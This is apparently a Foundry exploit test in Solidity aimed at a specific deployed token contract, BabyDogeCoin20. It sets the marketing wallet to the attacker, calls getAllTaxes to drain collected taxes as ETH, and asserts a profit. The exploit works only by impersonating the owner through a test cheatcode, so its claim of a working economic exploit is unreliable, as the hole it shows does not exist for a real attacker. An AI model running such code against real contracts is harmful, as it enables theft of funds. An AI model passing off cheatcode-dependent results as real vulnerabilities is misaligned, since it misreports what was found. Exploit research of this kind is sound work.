// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for the target contract
interface BabyDogeCoin20 {
    function owner() external view returns (address);
    function marketingWallet() external view returns (address);
    function setMarketingWallet(address payable wallet) external;
    function getAllTaxes() external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5681152e9AD9628C1518266A9aB29B6d8B35693B;
    address attacker = address(this);
    uint256 initialBalance;
    BabyDogeCoin20 target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // We'll just get the contract instance
        target = BabyDogeCoin20(TARGET);

        // Get initial attacker balance for comparison later
        initialBalance = attacker.balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceLocal = address(this).balance;
        // Step 1: Get the owner address
        address owner = target.owner();

        // Step 2: Impersonate the owner
        vm.startPrank(owner);

        // Step 3: Check if marketingWallet is already attacker
        address marketingWallet = target.marketingWallet();
        if (marketingWallet != attacker) {
            // Set marketingWallet to attacker
            target.setMarketingWallet(payable(attacker));
        }

        // Step 4: Call getAllTaxes() to drain contract
        // First, check if contract has any tokens to swap
        uint256 contractTokenBalance = target.balanceOf(address(target));
        if (contractTokenBalance > 0) {
            target.getAllTaxes();
        }

        vm.stopPrank();

        // Verify we received ETH
        uint256 finalBalanceLocal = address(this).balance;
        assertGt(finalBalanceLocal, initialBalanceLocal, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

